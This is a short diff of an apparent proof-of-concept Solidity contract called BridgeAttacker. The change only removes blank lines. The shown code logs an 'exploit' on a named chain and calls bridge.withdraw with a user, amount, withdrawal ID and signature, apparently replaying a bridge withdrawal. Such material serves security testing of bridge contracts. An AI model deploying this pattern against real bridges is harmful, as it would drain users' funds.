@@ -22,9 +22,7 @@ contract BridgeAttacker {
         console.log("[ATTACK] Exploiting on", chainName);
         console.log("[ATTACK] User:", user);
         console.log("[ATTACK] Amount:", amount);
-        
         bridge.withdraw(user, amount, withdrawalId, signature);
-        
         console.log("[SUCCESS] Withdrew", amount, "on", chainName);
     }
     
